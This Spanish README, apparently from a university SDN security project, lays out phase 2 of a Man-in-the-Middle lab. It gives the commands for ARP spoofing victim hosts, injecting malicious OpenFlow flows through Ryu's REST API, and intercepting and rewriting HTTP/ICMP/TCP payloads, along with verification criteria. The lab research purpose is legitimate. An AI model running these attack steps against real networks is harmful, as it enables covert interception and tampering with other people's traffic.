# Fase 2 — Implementación del ataque

> Semana 2 del proyecto. Metodología, sección 9 — "Fase 2: Implementación del Ataque".
> Cubre el objetivo específico **OE1**.

## 1. Objetivo

Implementar el ataque Man-in-the-Middle sobre el entorno de la Fase 1, con sus tres vectores:

1. **ARP Spoofing** con Scapy desde el atacante (h3) para colocarse entre h1 y h2.
2. **Inyección de flujos OpenFlow maliciosos** en el OVS mediante la **API REST de Ryu**.
3. **Interceptación y modificación** de paquetes HTTP, ICMP y TCP antes de su reenvío.

> ⚠️ Uso exclusivo en el laboratorio aislado (GNS3 + VirtualBox) del proyecto.

## 2. Componentes entregados

| Archivo | Vector | Descripción |
|---------|--------|-------------|
| `attack/arp_spoof.py` | ARP Spoofing | Envenena las cachés ARP de h1 y h2; restaura al salir (Ctrl+C). |
| `attack/flow_inject.py` | Inyección de flujos | Lista/volca/inyecta/limpia flujos en el OVS vía API REST de Ryu. |
| `attack/mitm_intercept.py` | Intercept./modif. | Captura y modifica payloads (NetfilterQueue + Scapy) y guarda `.pcap`. |
| `attack/demo_traffic.sh` | Validación | Genera tráfico ICMP/TCP/HTTP desde una víctima. |
| `attack/verify_mitm.sh` | Validación | Confirma el MITM revisando la caché ARP de la víctima. |

## 3. Requisitos

Sobre el entorno de la Fase 1, en la **VM atacante (h3)**:

```bash
sudo ./scripts/setup_env.sh host      # ya instala Scapy
pip3 install netfilterqueue requests  # para intercepción y API REST
sudo apt-get install -y curl netcat   # para los scripts de demo
```

El reenvío IPv4 del atacante debe estar activo (lo hace `hosts/config_host.sh h3`):
```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

Para la inyección de flujos, lanzar el controlador con la API REST:
```bash
REST=1 ./scripts/run_controller.sh
```

## 4. Procedimiento

### 4.1 Vector A — ARP Spoofing (h3)
```bash
sudo python3 attack/arp_spoof.py --target 10.0.0.11 --gateway 10.0.0.12
```
Deja esta terminal corriendo: reenvía ARP envenenado cada 2 s. Al pulsar Ctrl+C restaura las cachés.

### 4.2 Vector C — Interceptar / modificar (h3, otra terminal)
```bash
# Solo observar
sudo python3 attack/mitm_intercept.py --mode sniff --auto-iptables

# Modificar payloads al vuelo (ej. censurar una palabra)
sudo python3 attack/mitm_intercept.py --mode modify --find "Hola" --replace "XXXX" --auto-iptables
```

### 4.3 Generar tráfico de prueba (en h1)
```bash
# En h2, antes: python3 -m http.server 8000   y/o   nc -l -p 9000
./attack/demo_traffic.sh 10.0.0.12
```

### 4.4 Vector B — Inyección de flujos (alternativa/complemento SDN)
```bash
python3 attack/flow_inject.py --controller 192.168.100.10 list
python3 attack/flow_inject.py --controller 192.168.100.10 dump --dpid 1
# Duplicar el tráfico de la víctima hacia el puerto del atacante
python3 attack/flow_inject.py --controller 192.168.100.10 inject \
    --dpid 1 --src-ip 10.0.0.11 --normal-port 2 --attacker-port 3
# Limpieza
python3 attack/flow_inject.py --controller 192.168.100.10 clear --dpid 1
```
> Ajusta `--normal-port` y `--attacker-port` a los números de puerto OpenFlow reales del OVS
> (`sudo ovs-ofctl -O OpenFlow13 show br0`).

## 5. Verificación / criterio de cierre

La Fase 2 está **completa al 100%** cuando:

1. Tras lanzar `arp_spoof.py`, en h1 la caché ARP de `10.0.0.12` muestra la **MAC del atacante**:
   `./attack/verify_mitm.sh 10.0.0.12 <MAC_de_h3>` → "MITM CONFIRMADO".
2. `mitm_intercept.py` lista el tráfico ICMP/TCP/HTTP entre h1 y h2 y genera `captures/mitm_intercept.pcap`.
3. En modo `modify`, el contenido alterado llega modificado al destino (se observa el reemplazo).
4. `flow_inject.py inject` instala el flujo malicioso y aparece en `dump-flows br0` (prioridad 100, cookie `0x6d69746d`).
5. La conectividad entre víctimas **no se interrumpe** durante el ataque (MITM transparente).

## 6. Notas de implementación

- `arp_spoof.py` restaura las cachés legítimas al terminar para dejar la red limpia.
- `mitm_intercept.py` usa **NetfilterQueue**: encola el tráfico `FORWARD` y deja que Scapy decida.
  La regla `iptables` se agrega/quita sola con `--auto-iptables`.
- `flow_inject.py` marca sus flujos con una **cookie** (`0x6d69746d`) para poder borrarlos sin afectar
  los del learning switch.
- Todas las capturas van a `captures/` (excluido de git).

## 7. Próximo paso

**Fase 3 — Recolección y análisis de evidencias:** capturar pcap de forma sistemática, extraer
estadísticas de flujo vía API REST de Ryu, correlacionar logs e identificar los **IoC** del MITM.
